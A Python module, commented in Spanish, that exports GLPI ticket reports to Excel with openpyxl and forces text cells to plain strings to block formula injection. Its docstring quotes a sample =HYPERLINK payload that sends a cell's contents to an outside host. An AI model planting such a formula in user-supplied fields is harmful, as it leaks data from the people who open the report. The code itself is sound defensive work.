from io import BytesIO
from datetime import datetime

from openpyxl import Workbook
from openpyxl.styles import Alignment, Border, Font, PatternFill, Side
from openpyxl.utils import get_column_letter

# El mismo reporte que sale en PDF, pero en una planilla: sirve para lo que el
# PDF no puede, que es filtrar, ordenar y sumar sin volver a pedirle nada a
# nadie. Por eso las fechas van como fecha de Excel y no como texto, y la tabla
# de detalle arranca con el autofiltro puesto.
#
# Los colores son los mismos que usa pdf_generator.py, en claro: una planilla se
# imprime y se lee en pantalla blanca, no sobre el fondo negro de la app.

GRAY_100 = "F5F5F5"
GRAY_200 = "E5E5E5"
GRAY_400 = "A1A1A1"
GRAY_900 = "171717"
BLUE     = "3A81F6"
YELLOW   = "D97706"
GREEN    = "16A34A"

STATUS_LABELS = {1: "Nuevo", 2: "En curso", 3: "En curso (Plan.)",
                 4: "Pendiente", 5: "Resuelto", 6: "Cerrado"}
STATUS_COLORS = {1: BLUE, 2: BLUE, 3: BLUE, 4: YELLOW, 5: GREEN, 6: GREEN}

EN_CURSO    = {1, 2, 3}
PENDIENTES  = {4}
FINALIZADOS = {5, 6}

REPORT_TITLES = {
    "by_technician": "Reporte por Técnico",
    "by_area":       "Reporte por Área",
    "by_form":       "Reporte por Formulario",
}

COLUMNS = [
    ("ID",          10),
    ("Título",      60),
    ("Estado",      16),
    ("Técnico",     24),
    ("Solicitante", 24),
    ("Apertura",    14),
    ("Vencimiento", 14),
]

THIN = Side(style="thin", color=GRAY_200)


def _celda(ws, row, column, value):
    """Escribe una celda forzando a texto lo que sea texto.

    Excel decide si una celda es dato o formula mirando el primer caracter: un
    "=", un "+", un "-" o un "@" al principio la convierten en formula, y
    openpyxl hace lo mismo al guardar. El titulo de un ticket lo escribe
    cualquiera que abra un ticket en GLPI, asi que un titulo como

        =HYPERLINK("http://afuera/?"&A1,"Ver ticket")

    llega a la planilla como formula de verdad, y la corre la maquina del que
    abre el reporte -el jefe, un tecnico- sin que Excel pregunte nada.

    Pisar data_type despues de asignar el valor deja la celda marcada como
    cadena en el XML, asi que Excel la muestra tal cual en vez de interpretarla.
    Se hace por tipo y no revisando el primer caracter contra una lista: la
    lista se olvida un caso, y aca no hay ninguna celda de texto que tenga que
    ser formula.

    Los numeros y las fechas siguen entrando como numeros y fechas: son los que
    hacen que el Excel se pueda ordenar y filtrar, que es para lo que se pide.
    """
    c = ws.cell(row=row, column=column)
    c.value = value
    if isinstance(value, str):
        # openpyxl ya marco la celda como formula si el texto arrancaba con "=".
        # Esto lo deshace: el orden importa, primero el valor y despues el tipo.
        c.data_type = "s"
    return c


def _st(status_val):
    try:
        return int(status_val)
    except Exception:
        return 0


def _fecha(val):
    """Fecha real de Excel, para que se pueda ordenar y filtrar por rango.

    Si el valor no viene con el formato de GLPI se devuelve tal cual: es
    preferible una celda de texto a perder el dato.
    """
    if not val:
        return None
    s = str(val)[:10]
    try:
        return datetime.strptime(s, "%Y-%m-%d").date()
    except Exception:
        return s


def generate_report_excel(
    report_type: str,
    filter_label: str,
    date_from: str,
    date_to: str,
    tickets: list[dict],
) -> bytes:
    wb = Workbook()
    ws = wb.active
    ws.title = "Reporte"

    open_t    = [t for t in tickets if _st(t.get("status")) in EN_CURSO]
    pending_t = [t for t in tickets if _st(t.get("status")) in PENDIENTES]
    closed_t  = [t for t in tickets if _st(t.get("status")) in FINALIZADOS]

    ancho_tabla = len(COLUMNS)

    # ── Encabezado ────────────────────────────────────────────────────────────
    ws.merge_cells(start_row=1, start_column=1, end_row=1, end_column=ancho_tabla)
    c = _celda(ws, 1, 1, REPORT_TITLES.get(report_type, "Reporte"))
    c.font = Font(bold=True, size=16, color=GRAY_900)
    c.alignment = Alignment(vertical="center")
    ws.row_dimensions[1].height = 26

    ws.merge_cells(start_row=2, start_column=1, end_row=2, end_column=ancho_tabla)
    # filter_label llega desde la pantalla (el nombre del tecnico o del area va
    # como parametro en la URL del reporte), asi que tampoco es texto de confianza.
    c = _celda(ws, 2, 1, filter_label)
    c.font = Font(size=11, color="404040")

    periodo = f"Período: {_texto_fecha(date_from)} — {_texto_fecha(date_to)}"
    generado = f"Generado: {datetime.now().strftime('%d/%m/%Y %H:%M')}"
    ws.merge_cells(start_row=3, start_column=1, end_row=3, end_column=ancho_tabla)
    c = _celda(ws, 3, 1, f"{periodo}    ·    {generado}")
    c.font = Font(size=9, color=GRAY_400)

    # ── Resumen ───────────────────────────────────────────────────────────────
    # La etiqueta arriba y el numero abajo, como en la pantalla.
    resumen = [
        ("ABIERTOS",   len(open_t),    BLUE),
        ("PENDIENTES", len(pending_t), YELLOW),
        ("CERRADOS",   len(closed_t),  GREEN),
        ("TOTAL",      len(tickets),   GRAY_900),
    ]
    for i, (etiqueta, valor, color) in enumerate(resumen, start=1):
        lbl = _celda(ws, 5, i, etiqueta)
        lbl.font = Font(bold=True, size=8, color=GRAY_400)
        lbl.alignment = Alignment(horizontal="center")
        lbl.fill = PatternFill("solid", fgColor=GRAY_100)
        lbl.border = Border(top=THIN, left=THIN, right=THIN)

        num = _celda(ws, 6, i, valor)
        num.font = Font(bold=True, size=18, color=color)
        num.alignment = Alignment(horizontal="center")
        num.border = Border(bottom=THIN, left=THIN, right=THIN)
    ws.row_dimensions[6].height = 26

    # ── Detalle ───────────────────────────────────────────────────────────────
    fila_encabezado = 8
    for i, (titulo, ancho) in enumerate(COLUMNS, start=1):
        c = _celda(ws, fila_encabezado, i, titulo.upper())
        c.font = Font(bold=True, size=9, color=GRAY_900)
        c.fill = PatternFill("solid", fgColor=GRAY_200)
        c.alignment = Alignment(vertical="center")
        c.border = Border(bottom=Side(style="thin", color=GRAY_400))
        ws.column_dimensions[get_column_letter(i)].width = ancho

    fila = fila_encabezado + 1
    for t in tickets:
        sv = _st(t.get("status"))
        valores = [
            t.get("id"),
            t.get("title") or "",
            STATUS_LABELS.get(sv, str(sv)),
            t.get("tech") or "Sin asignar",
            t.get("requester") or "Sin asignar",
            _fecha(t.get("opened_at")),
            _fecha(t.get("due_at")),
        ]
        for i, valor in enumerate(valores, start=1):
            c = _celda(ws, fila, i, valor)
            c.font = Font(size=10, color=GRAY_900)
            c.border = Border(bottom=THIN)
            if i in (6, 7):
                c.number_format = "DD/MM/YYYY"
                c.alignment = Alignment(horizontal="left")
        # El estado es lo unico pintado: es el dato que se busca de un vistazo.
        ws.cell(row=fila, column=3).font = Font(
            bold=True, size=10, color=STATUS_COLORS.get(sv, GRAY_900)
        )
        fila += 1

    if tickets:
        # Autofiltro y panel congelado: es para lo que uno pide el Excel.
        ws.auto_filter.ref = f"A{fila_encabezado}:{get_column_letter(ancho_tabla)}{fila - 1}"
        ws.freeze_panes = f"A{fila_encabezado + 1}"
    else:
        c = _celda(ws, fila, 1,
                   "No se encontraron tickets para los filtros seleccionados.")
        c.font = Font(size=10, italic=True, color=GRAY_400)

    buffer = BytesIO()
    wb.save(buffer)
    return buffer.getvalue()


def _texto_fecha(val):
    if not val:
        return "—"
    s = str(val)[:10]
    try:
        return datetime.strptime(s, "%Y-%m-%d").strftime("%d/%m/%Y")
    except Exception:
        return s
